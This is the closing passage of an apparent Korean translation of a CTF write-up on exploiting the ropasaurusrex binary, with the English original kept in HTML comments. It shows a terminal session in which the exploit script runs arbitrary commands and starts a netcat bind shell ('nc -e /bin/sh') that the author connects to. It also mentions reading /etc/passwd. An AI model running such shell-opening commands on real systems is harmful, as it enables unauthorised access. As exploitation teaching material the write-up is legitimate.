물론 `cat /etc/passwd`를 원하는 값으로 바꿀 수 있고, netcat 리스너도 넣을 수 있다!

``` sh
ron@debian-x86 ~ $ ruby sploit.rb "pwd"
/home/ron
ron@debian-x86 ~ $ ruby sploit.rb "whoami"
ron
ron@debian-x86 ~ $ ruby sploit.rb "nc -vv -l -p 5555 -e /bin/sh" &
[1] 3015
ron@debian-x86 ~ $ nc -vv localhost 5555
debian-x86.skullseclabs.org [127.0.0.1] 5555 (?) open
pwd
/home/ron
whoami
ron
```

<!-- ## Conclusion -->

## <a id="conclusion"></a>결론

<!-- And that's it! We just wrote a reliable, DEP/ASLR-bypassing exploit for ropasaurusrex. -->
이게 끝이다! 난 믿을 만한, DEP/ASLR을 우회하는 ropasaurusrex 익스플로잇을 만들었다.

<!-- Feel free to comment or contact me if you have any questions! -->
질문이 있다면 댓글을 달거나 나에게 연락해주길 바란다!
